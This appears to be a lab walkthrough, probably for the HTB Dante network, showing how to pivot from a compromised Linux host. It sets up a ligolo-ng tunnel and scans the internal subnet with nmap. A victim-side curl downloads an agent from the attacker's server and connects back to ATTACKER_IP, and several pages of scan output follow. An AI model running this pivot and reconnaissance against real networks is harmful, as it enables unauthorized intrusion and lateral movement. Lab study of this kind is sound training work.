## Pivoting to other Machines on the Internal Network

We notice that the machine we just compromised is connected to an internal network 
```web-nix01
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:0b:cd brd ff:ff:ff:ff:ff:ff
    inet 172.16.1.100/24 brd 172.16.1.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb0:bcd/64 scope link
       valid_lft forever preferred_lft forever
```

Let's setup a tunnel with `ligolo-ng` to access the network and scan it for additional machines:

setup proxy
```attacker-machine
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

Send the ligolo-agent to the victim

```attacker-machine
python3 -m http.server 80
```

```victim-machine
curl http://<ip>/ligolo-agent > ligolo-agent
chmod +x ligolo-agent
./agent_linux_amd64 -connect ATTACKER_IP:11601 -ignore-cert
```

now on the proxy you can setup the connection using autoroute.


## Internal Network Host Discovery

Now that we have setup the ligolo tunnel, we can do Host discovery on the internal network, but remember that a lot of machines block ICMP packets and that due to the nature of the ligolo tunnel, Syn scans aren't allowed.

> Correction! With a ligolo TUN established - sync scan are allowed! 

So we must perform a host discovery without pinging and without syn scanning:

```
nmap -sT -Pn -p 22,80,443,445,3389 <ip-range>
```

```
nmap -sU -Pn -p 53,67,68,123,161 <ip-range>
```

or combine both
```
nmap -sT -sU -Pn -p T:22,80,443,445,3389,U:53,123,161 <ip-range>
```
clean output:
```
nmap -sT -Pn -p 22,80,443,445,3389 172.16.1.0/24 --open -oG - | grep "Nmap scan report" | awk '{print $5}' > internal-network-tcp-ips
```

```
172.16.1.1    - pfSense
172.16.1.5    -
172.16.1.10   - 
172.16.1.12   - XAMPP / DANTE-NIX04
172.16.1.13   - XAMPP
172.16.1.17   - 
172.16.1.19   -
172.16.1.20   - Windows Server 2012 R2 Essentials
172.16.1.100  -
172.16.1.101  -
172.16.1.102  -
```
## Internal Network Port Scanning

We can use the ip list we generate during our host discovery to easily enumerate all ports on the internal network

```
nmap -iL internal-network-tcp-ips -sT -sU -p- -sV 
```

```
sudo nmap -sT -p- -Pn -T5 -iL internal-network-tcp-ips -o internal-network-tcp-scan
```

This scan will take awhile we can also approach each machine one-by-one

### TCP Scan:

```
Nmap scan report for 172.16.1.1

PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx
443/tcp open  ssl/http nginx

Nmap scan report for 172.16.1.5

PORT      STATE SERVICE
21/tcp    open  ftp
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49673/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown

Nmap scan report for 172.16.1.10

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap scan report for 172.16.1.12

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

Nmap scan report for 172.16.1.13

PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
445/tcp open  microsoft-ds

80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
33060/tcp open  mysqlx

Nmap scan report for 172.16.1.19

PORT      STATE    SERVICE
80/tcp    open     http
8080/tcp  open     http-proxy
15657/tcp filtered unknown
33060/tcp open     mysqlx
38742/tcp filtered unknown
44206/tcp filtered unknown
58320/tcp filtered unknown

Nmap scan report for 172.16.1.20

PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8912/tcp  open  wcbackup
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49171/tcp open  unknown
49192/tcp open  unknown
49195/tcp open  unknown
49197/tcp open  unknown
49278/tcp open  unknown
65500/tcp open  unknown
65520/tcp open  unknown

Nmap scan report for 172.16.1.101

PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap scan report for 172.16.1.102

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
33060/tcp open  mysqlx
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

### UDP Scan

```
Nmap scan report for 172.16.1.5

PORT      STATE         SERVICE      VERSION
137/udp   open          netbios-ns   Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: DANTE-SQL01
|   interfaces:
|_    172.16.1.5
1434/udp  open          ms-sql-m     Microsoft SQL Server 15.0.2000.5 (ServerName: DANTE-SQL01; TCPPort: 1433)
Service Info: Host: DANTE-NIX02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:64:87 (VMware)


Nmap scan report for 172.16.1.10

PORT      STATE         SERVICE      VERSION
137/udp   open          netbios-ns   Microsoft Windows netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: DANTE-NIX02
|   interfaces:
|_    172.16.1.10
Host is up (0.52s latency).
Service Info: Host: DANTE-WS03; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-NIX02, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)


Nmap scan report for 172.16.1.17
Host is up (0.35s latency).

PORT      STATE         SERVICE      VERSION
137/udp   open          netbios-ns   Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: DANTE-NIX03
|   interfaces:
|_    172.16.1.17
Service Info: Host: DANTE-NIX03

Host script results:
|_nbstat: NetBIOS name: DANTE-NIX03, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)


Nmap scan report for 172.16.1.20
Host is up (0.46s latency).

PORT      STATE         SERVICE      VERSION
53/udp    open          domain       Simple DNS Plus
123/udp   open          ntp          NTP v3
| ntp-info:
|_
137/udp   open          netbios-ns?
| nbns-interfaces:
|   hostname: DANTE-DC01
|   interfaces:
|_    172.16.1.20
| fingerprint-strings:
|   CIFS_NS_BC, CIFS_NS_UC:
|     CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
|     DANTE-DC01
|     DANTE
|     DANTE
|     DANTE-DC01
|_    DANTE
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port137-UDP:V=7.98%I=7%D=2/7%Time=698733BE%P=x86_64-pc-linux-gnu%r(CIFS
SF:_NS_UC,C1,"\x01\x91\x84\0\0\0\0\x01\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAAAA\0\0!\0\x01\0\0\0\0\0\x89\x05DANTE-DC01\x20\x20\x20\x20\x20\0\x
SF:04\0DANTE\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x1c\x84\0DANTE\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\0\x84\0DANTE-DC01\x20\x20\x20\x20\x20
SF:\x20\x04\0DANTE\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x1b\x04\0\0PV\x
SF:b0W\xd7\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0")%r(CIFS_NS_BC,C1,"\x01\x91\x84\0\0\0\0\x01\0\0\0\0\x2
SF:0CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0!\0\x01\0\0\0\0\0\x89\x05DANTE-DC0
SF:1\x20\x20\x20\x20\x20\0\x04\0DANTE\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x1c\x84\0DANTE\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\0\x84\0DANTE
SF:-DC01\x20\x20\x20\x20\x20\x20\x04\0DANTE\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x1b\x04\0\0PV\xb0W\xd7\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9s
|_nbstat: NetBIOS name: DANTE-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:57:d7 (VMware)


Nmap scan report for 172.16.1.101

PORT      STATE         SERVICE      VERSION
137/udp   open          netbios-ns   Microsoft Windows netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: DANTE-WS02
|   interfaces:
|_    172.16.1.101
Service Info: Host: DANTE-WS02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-WS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:32:f9 (VMware)


Nmap scan report for 172.16.1.102
PORT      STATE         SERVICE      VERSION
137/udp   open          netbios-ns   Microsoft Windows netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: DANTE-WS03
|   interfaces:
|_    172.16.1.102
Service Info: Host: DANTE-WS03; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-WS03, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:c1:49 (VMware)
```